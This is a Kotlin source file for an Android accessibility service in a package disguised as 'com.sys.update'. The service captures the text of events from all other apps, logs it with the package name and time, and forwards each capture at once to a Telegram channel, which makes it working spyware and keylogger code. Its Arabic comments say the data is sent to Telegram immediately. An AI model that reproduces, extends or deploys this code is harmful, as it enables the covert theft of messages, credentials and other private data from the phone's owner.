package com.sys.update

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AccessibilityHelper : AccessibilityService() {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    companion object {
        fun isEnabled(context: Context): Boolean {
            val service = "${context.packageName}/${AccessibilityHelper::class.java.name}"
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                if (splitter.next().equals(service, ignoreCase = true)) return true
            }
            return false
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("AccessibilityHelper", "Service connected")
        try {
            TelegramApi.sendMessage("♿ Accessibility Service تم تفعيله")
        } catch (_: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            val type = event.eventType
            val texts = mutableListOf<String>()
            for (i in 0 until event.text.size) {
                val t = event.text[i]?.toString() ?: ""
                if (t.isNotBlank()) texts.add(t)
            }

            if (texts.isEmpty()) return

            val entry = JSONObject().apply {
                put("type", "accessibility")
                put("time", timeFmt.format(Date()))
                put("package", pkg)
                put("event", type)
                put("texts", texts.joinToString(" | "))
                put("class", event.className?.toString() ?: "")
            }

            DataStore.appendAny(this, entry)

            // أرسل فوريًا للتيليجرام
            val msg = "📱 *${pkg}*\n[${entry.getString("time")}]\n\n${texts.joinToString("\n")}"
            TelegramApi.sendMessage(msg)

        } catch (e: Exception) {
            Log.e("AccessibilityHelper", "err: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d("AccessibilityHelper", "Service interrupted")
    }
}
